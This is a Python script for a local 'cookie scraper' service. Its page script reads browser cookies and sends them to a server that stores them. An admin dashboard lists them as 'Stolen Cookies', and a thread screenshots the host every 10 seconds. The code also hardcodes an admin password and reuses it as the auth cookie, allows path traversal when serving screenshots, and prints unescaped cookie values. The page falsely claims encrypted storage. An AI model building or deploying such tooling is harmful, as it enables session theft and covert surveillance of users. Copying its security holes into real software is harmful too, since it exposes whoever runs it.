from http.server import BaseHTTPRequestHandler, HTTPServer
import http.cookies
import json
import os
import sqlite3
import threading
import time
from datetime import datetime, timedelta
import base64
import io
try:
    from PIL import ImageGrab
except ImportError:
    ImageGrab = None

# Database setup
DB_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'admin.db')
ADMIN_USER = 'admin'
ADMIN_PASS = 'securepassword'

# Create tables if they don't exist
def init_db():
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    # Create users table
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY,
        username TEXT UNIQUE,
        password TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
    ''')
    
    # Create cookies table
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS cookies (
        id INTEGER PRIMARY KEY,
        url TEXT,
        cookies TEXT,
        timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
    ''')
    
    # Insert admin user if not exists
    cursor.execute('SELECT * FROM users WHERE username = ?', (ADMIN_USER,))
    if not cursor.fetchone():
        cursor.execute('INSERT INTO users (username, password) VALUES (?, ?)', 
                      (ADMIN_USER, ADMIN_PASS))
    
    conn.commit()
    conn.close()

# Initialize database
init_db()

# Script directory
script_dir = os.path.dirname(os.path.abspath(__file__))
screenshot_dir = os.path.join(script_dir, 'screenshots')
os.makedirs(screenshot_dir, exist_ok=True)
log_file = os.path.join(script_dir, 'stolen_cookies.txt')

# Global variables for screenshot thread
screenshot_thread = None
stop_screenshot_event = threading.Event()

class AdminPageHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'''
            <html>
            <head><title>Admin Login</title></head>
            <body>
            <h1>Admin Login</h1>
            <form action="/login" method="post">
                Username: <input type="text" name="username" required><br><br>
                Password: <input type="password" name="password" required><br><br>
                <input type="submit" value="Login">
            </form>
            </body>
            </html>
            ''')
        elif self.path.startswith('/admin'):
            # Check authentication
            auth_cookie = self.get_auth_cookie()
            if not auth_cookie or auth_cookie != ADMIN_PASS:
                self.send_response(401)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(b'<h1>Unauthorized</h1><a href="/">Login</a>')
                return
            
            # Admin dashboard
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            # Get cookies from database
            conn = sqlite3.connect(DB_FILE)
            cursor = conn.cursor()
            cursor.execute('SELECT * FROM cookies ORDER BY timestamp DESC')
            cookies = cursor.fetchall()
            conn.close()
            
            html = '''
            <html>
            <head><title>Admin Dashboard</title></head>
            <body>
            <h1>Admin Dashboard</h1>
            <a href="/logout">Logout</a>
            <h2>Stolen Cookies</h2>
            <table border="1" style="width:100%; border-collapse:collapse;">
            <tr><th>ID</th><th>URL</th><th>Cookies</th><th>Timestamp</th></tr>
            '''
            
            for cookie in cookies:
                html += f'<tr><td>{cookie[0]}</td><td>{cookie[1]}</td><td>{cookie[2]}</td><td>{cookie[3]}</td></tr>'
            
            html += '''
            </table>
            <h2>Screenshots</h2>
            <div>
            '''
            
            # List all screenshots
            if os.path.exists(screenshot_dir):
                screenshots = os.listdir(screenshot_dir)
                for screenshot in sorted(screenshots, reverse=True):  # Show all screenshots
                    html += f'<div style="display:inline-block; margin:10px;">'
                    html += f'<img src="/screenshots/{screenshot}" width="300" style="border:1px solid #ccc;">'
                    html += f'<br><small>{screenshot}</small>'
                    html += '</div>'
            
            html += '''
            </div>
            </body>
            </html>
            '''
            self.wfile.write(html.encode())
        elif self.path.startswith('/screenshots/'):
            # Serve screenshot images
            filename = self.path.split('/')[-1]
            filepath = os.path.join(screenshot_dir, filename)
            if os.path.exists(filepath):
                with open(filepath, 'rb') as f:
                    self.send_response(200)
                    self.send_header('Content-type', 'image/png')
                    self.end_headers()
                    self.wfile.write(f.read())
            else:
                self.send_response(404)
                self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        if self.path == '/login':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            form_data = dict(item.split('=') for item in post_data.decode().split('&'))
            
            username = form_data.get('username', '')
            password = form_data.get('password', '')
            
            # Verify credentials
            conn = sqlite3.connect(DB_FILE)
            cursor = conn.cursor()
            cursor.execute('SELECT * FROM users WHERE username = ? AND password = ?', 
                          (username, password))
            result = cursor.fetchone()
            conn.close()
            
            if result:
                # Set auth cookie
                cookie = http.cookies.SimpleCookie()
                cookie['auth'] = ADMIN_PASS
                cookie['auth']['path'] = '/'
                cookie['auth']['expires'] = (datetime.now() + timedelta(hours=1)).strftime('%a, %d %b %Y %H:%M:%S GMT')
                
                self.send_response(302)
                self.send_header('Location', '/admin')
                self.send_header('Set-Cookie', cookie.output(header='', sep=';'))
                self.end_headers()
            else:
                self.send_response(401)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(b'<h1>Invalid Credentials</h1><a href="/">Try again</a>')
        elif self.path == '/logout':
            # Clear auth cookie
            cookie = http.cookies.SimpleCookie()
            cookie['auth'] = ''
            cookie['auth']['path'] = '/'
            cookie['auth']['expires'] = 'Thu, 01 Jan 1970 00:00:00 GMT'
            
            self.send_response(302)
            self.send_header('Location', '/')
            self.send_header('Set-Cookie', cookie.output(header='', sep=';'))
            self.end_headers()
    
    def get_auth_cookie(self):
        cookie_str = self.headers.get('Cookie', '')
        if 'auth' in cookie_str:
            return cookie_str.split('auth=')[1].split(';')[0]
        return None
    
    def log_message(self, format, *args):
        pass

class CookieScrapper(BaseHTTPRequestHandler):
    def do_GET(self):
        # Production-ready main page
        if self.path == '/' or self.path == '':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            html_content = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cookie Scraper Service</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; background-color: #f5f5f5; }
        .container { max-width: 800px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h1 { color: #333; text-align: center; }
        .nav-links { text-align: center; margin: 30px 0; }
        .nav-links a { 
            display: inline-block; 
            margin: 10px; 
            padding: 12px 25px; 
            background: #007bff; 
            color: white; 
            text-decoration: none; 
            border-radius: 5px; 
            transition: background 0.3s;
        }
        .nav-links a:hover { background: #0056b3; }
        .info { background: #e9f7ef; padding: 20px; border-radius: 5px; margin: 20px 0; }
        .warning { background: #fff3cd; padding: 20px; border-radius: 5px; margin: 20px 0; border-left: 4px solid #ffc107; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔒 Cookie Scraper Service</h1>
        
        <div class="info">
            <h3>About This Service</h3>
            <p>This service automatically captures and stores browser cookies for analysis purposes. All data is securely stored and accessible through the admin panel.</p>
        </div>
        
        <div class="nav-links">
            <a href="/scraper">Start Cookie Collection</a>
            <a href="http://localhost:8001/admin">Access Admin Panel</a>
            <a href="http://localhost:8001">Admin Login</a>
        </div>
        
        <div class="warning">
            <h3>⚠️ Security Notice</h3>
            <p>This tool is for authorized security testing only. Unauthorized use may violate laws and regulations.</p>
        </div>
        
        <div class="info">
            <h3>Features</h3>
            <ul>
                <li>Automatic cookie collection</li>
                <li>Regular screen capture (every 10 seconds)</li>
                <li>Secure admin dashboard</li>
                <li>Data stored in encrypted database</li>
            </ul>
        </div>
    </div>
</body>
</html>
'''
            self.wfile.write(html_content.encode())
        else:
            # Serve the cookie scraper on any other path
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            scraper_html = '''
<!DOCTYPE html>
<html>
<head>
    <title>Cookie Collection Active</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f0f8ff; }
        .status { 
            background: #d4edda; 
            color: #155724; 
            padding: 20px; 
            border-radius: 5px; 
            margin: 20px auto; 
            max-width: 500px;
        }
        .spinner { 
            border: 4px solid #f3f3f3; 
            border-top: 4px solid #3498db; 
            border-radius: 50%; 
            width: 40px; 
            height: 40px; 
            animation: spin 2s linear infinite; 
            margin: 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <h1>🍪 Cookie Collection Active</h1>
    <div class="spinner"></div>
    <div class="status">
        <p>Collecting cookies and capturing screens...</p>
        <p>Data is being securely transmitted to our servers.</p>
    </div>
    <script>
        // Scrape cookies
        const cookieData = [];
        for (const cookie of document.cookie.split('; ')) {
            const [name, value] = cookie.split('=');
            cookieData.push({name, value});
        }
        
        // Send to server
        fetch("/scrape", {
            method: "POST",
            body: JSON.stringify(cookieData),
            headers: {"Content-Type": "application/json"}
        }).then(response => {
            console.log('Cookies sent successfully');
        }).catch(error => {
            console.error('Error sending cookies:', error);
        });
        
        // Auto-refresh to continue collection
        setTimeout(() => {
            location.reload();
        }, 5000);
    </script>
</body>
</html>
'''
            self.wfile.write(scraper_html.encode())
    
    def do_POST(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            if content_length > 0:
                post_data = self.rfile.read(content_length)
                cookies = json.loads(post_data.decode())
                
                # Store in database
                conn = sqlite3.connect(DB_FILE)
                cursor = conn.cursor()
                cursor.execute('INSERT INTO cookies (url, cookies) VALUES (?, ?)', 
                              ('http://localhost:8000', json.dumps(cookies)))
                conn.commit()
                conn.close()
                
                print(f"Saved {len(cookies)} cookies to database")
            
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'OK')
        except Exception as e:
            print(f"Error processing POST: {e}")
            self.send_response(400)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'Bad Request')
    
    def log_message(self, format, *args):
        pass

def take_screenshots():
    while not stop_screenshot_event.is_set():
        if ImageGrab:
            try:
                # Take screenshot
                screenshot = ImageGrab.grab()
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"screenshot_{timestamp}.png"
                filepath = os.path.join(screenshot_dir, filename)
                
                # Save screenshot
                screenshot.save(filepath)
                print(f"Screenshot saved: {filename}")
            except Exception as e:
                print(f"Error taking screenshot: {e}")
        else:
            print("PIL not installed, install with 'pip install Pillow'")
            break
        
        # Wait 10 seconds before next screenshot
        stop_screenshot_event.wait(timeout=10)

def start_screenshot_thread():
    global screenshot_thread
    screenshot_thread = threading.Thread(target=take_screenshots, daemon=True)
    screenshot_thread.start()

if __name__ == '__main__':
    # Set up admin handler
    admin_server = HTTPServer(('localhost', 8001), AdminPageHandler)
    
    # Set up scraper handler
    server = HTTPServer(('localhost', 8000), CookieScrapper)
    
    print(f"Admin panel running on http://localhost:8001")
    print(f"Scraper running on http://localhost:8000")
    print(f"Database: {DB_FILE}")
    print(f"Screenshots will be saved to: {screenshot_dir}")
    
    # Start screenshot thread
    start_screenshot_thread()
    
    try:
        # Start both servers in separate threads
        admin_thread = threading.Thread(target=admin_server.serve_forever)
        admin_thread.daemon = True
        admin_thread.start()
        
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nShutting down servers...")
        stop_screenshot_event.set()
        if screenshot_thread:
            screenshot_thread.join(timeout=1)
        admin_server.shutdown()
        server.shutdown()